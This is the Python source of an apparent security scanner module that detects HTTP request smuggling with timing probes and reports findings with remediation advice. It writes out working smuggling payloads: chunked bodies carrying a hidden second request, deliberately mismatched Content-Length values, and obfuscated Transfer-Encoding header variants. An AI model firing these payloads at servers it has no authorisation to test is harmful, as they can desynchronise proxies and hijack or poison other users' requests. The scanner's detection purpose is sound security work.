"""
GrotAssault — HTTP Request Smuggling payloads.

Tests for:
- CL.TE smuggling (Content-Length honoured by front-end, Transfer-Encoding by back-end)
- TE.CL smuggling (Transfer-Encoding honoured by front-end, Content-Length by back-end)
- TE.TE smuggling (both honour TE but one can be confused with obfuscation)
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClientMixin

logger = logging.getLogger("krumpa.grotassault.smuggling")


@dataclass
class SmugglingResult:
    """Result of a smuggling probe."""
    technique: str  # "CL.TE", "TE.CL", "TE.TE"
    vulnerable: bool
    response_time_ms: float
    status_code: int = 0
    evidence: str = ""


# Standard detection threshold (ms) — if the response takes longer
# than expected, the back-end may be waiting for more data (smuggled).
_TIMING_THRESHOLD_MS = 5000.0


class HttpSmugglingChecker(HttpClientMixin):
    """
    Detect HTTP request smuggling via timing-based probes.

    Uses James Kettle's pioneering differential-timing technique:
    send a smuggling payload and measure whether the server blocks
    waiting for the "hidden" second request to complete.
    """

    def __init__(
        self,
        http_client: Any = None,
        *,
        timeout_ms: float = 10000.0,
    ) -> None:
        self._client = http_client
        self._owns_client = False
        self._timeout_ms = timeout_ms

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def check(self, target: Target) -> List[Finding]:
        """Run all smuggling techniques against a target."""
        if not self._client:
            return []

        findings: List[Finding] = []

        for _technique, probe_fn in [
            ("CL.TE", self._probe_cl_te),
            ("TE.CL", self._probe_te_cl),
            ("TE.TE", self._probe_te_te),
        ]:
            result = await probe_fn(target)
            if result and result.vulnerable:
                findings.append(Finding(
                    title=f"HTTP request smuggling ({result.technique})",
                    description=(
                        f"The server at {target.url} may be vulnerable to "
                        f"{result.technique} request smuggling. Response time "
                        f"was {result.response_time_ms:.0f}ms (threshold: "
                        f"{_TIMING_THRESHOLD_MS:.0f}ms)."
                    ),
                    severity=Severity.CRITICAL,
                    target=target,
                    evidence=result.evidence,
                    remediation=(
                        "Ensure front-end and back-end servers agree on request "
                        "boundaries. Disable Transfer-Encoding if not needed. "
                        "Use HTTP/2 end-to-end to eliminate ambiguity."
                    ),
                    cwe=444,  # Inconsistent Interpretation of HTTP Requests
                    tags=["smuggling", result.technique.lower(), "http"],
                ))

        return findings

    # ------------------------------------------------------------------
    # Offline analysis
    # ------------------------------------------------------------------

    def analyze_headers(
        self,
        headers: Dict[str, str],
    ) -> List[str]:
        """
        Analyse response headers for smuggling indicators (offline).
        Returns a list of warning strings.
        """
        warnings: List[str] = []

        # Check if both CL and TE are in response (uncommon but telling)
        has_cl = "content-length" in {k.lower() for k in headers}
        has_te = "transfer-encoding" in {k.lower() for k in headers}

        if has_cl and has_te:
            warnings.append(
                "Response contains both Content-Length and Transfer-Encoding headers — "
                "this is a strong indicator of smuggling risk."
            )

        # Check server header for known multi-tier setups
        _server = headers.get("server", headers.get("Server", "")).lower()
        via = headers.get("via", headers.get("Via", "")).lower()

        if via:
            warnings.append(
                f"Via header present ({via}) — indicates a proxy chain "
                f"that may have inconsistent HTTP parsing."
            )

        # Check for ambiguous TE values
        te = headers.get("transfer-encoding", headers.get("Transfer-Encoding", ""))
        if te and te.lower().strip() != "chunked":
            warnings.append(
                f"Non-standard Transfer-Encoding value: '{te}' — "
                f"may confuse one layer of the stack."
            )

        return warnings

    # ------------------------------------------------------------------
    # Payloads (generate without sending — for test use)
    # ------------------------------------------------------------------

    @staticmethod
    def build_cl_te_payload(*, smuggled_path: str = "/") -> Dict[str, Any]:
        """Build a CL.TE probe payload."""
        # The idea: Content-Length says body is short, but body contains
        # a chunked terminator that the back-end will interpret as end-of-request,
        # followed by a smuggled request.
        body = "0\r\n\r\nGET {} HTTP/1.1\r\nHost: smuggled\r\n\r\n".format(smuggled_path)
        return {
            "headers": {
                "Transfer-Encoding": "chunked",
                "Content-Length": str(len(body.split("\r\n")[0]) + 2),  # only the "0\r\n"
            },
            "body": body,
        }

    @staticmethod
    def build_te_cl_payload(*, smuggled_method: str = "GET") -> Dict[str, Any]:
        """Build a TE.CL probe payload."""
        inner = f"{smuggled_method} / HTTP/1.1\r\nHost: smuggled\r\nContent-Length: 0\r\n\r\n"
        chunk = f"{len(inner):x}\r\n{inner}\r\n0\r\n\r\n"
        return {
            "headers": {
                "Transfer-Encoding": "chunked",
                "Content-Length": "4",  # misleadingly short
            },
            "body": chunk,
        }

    @staticmethod
    def build_te_te_payload() -> Dict[str, Any]:
        """Build a TE.TE probe payload with obfuscated Transfer-Encoding."""
        obfuscations = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: chunked\x00",
            "Transfer-Encoding:\tchunked",
        ]
        return {
            "obfuscations": obfuscations,
            "body": "0\r\n\r\n",
        }

    # ------------------------------------------------------------------
    # Internal probes
    # ------------------------------------------------------------------

    async def _probe_cl_te(self, target: Target) -> Optional[SmugglingResult]:
        """CL.TE timing probe."""
        payload = self.build_cl_te_payload()
        return await self._send_probe(target, "CL.TE", payload)

    async def _probe_te_cl(self, target: Target) -> Optional[SmugglingResult]:
        """TE.CL timing probe."""
        payload = self.build_te_cl_payload()
        return await self._send_probe(target, "TE.CL", payload)

    async def _probe_te_te(self, target: Target) -> Optional[SmugglingResult]:
        """TE.TE timing probe."""
        payload = self.build_te_te_payload()
        return await self._send_probe(target, "TE.TE", payload)

    async def _send_probe(
        self,
        target: Target,
        technique: str,
        payload: Dict[str, Any],
    ) -> Optional[SmugglingResult]:
        """Send a smuggling probe and measure timing."""
        if not self._client:
            return None
        try:
            headers = payload.get("headers", {})
            body = payload.get("body", "")

            start = time.monotonic()
            resp = await self._client.request(
                method="POST",
                url=target.url,
                headers=headers,
                body=body.encode() if isinstance(body, str) else body,
            )
            elapsed_ms = (time.monotonic() - start) * 1000

            vulnerable = elapsed_ms > _TIMING_THRESHOLD_MS

            return SmugglingResult(
                technique=technique,
                vulnerable=vulnerable,
                response_time_ms=elapsed_ms,
                status_code=resp.status_code,
                evidence=(
                    f"technique={technique}, elapsed={elapsed_ms:.0f}ms, "
                    f"status={resp.status_code}, threshold={_TIMING_THRESHOLD_MS:.0f}ms"
                ),
            )

        except Exception as exc:
            logger.debug("Smuggling probe error (%s): %s", technique, exc)
            return None
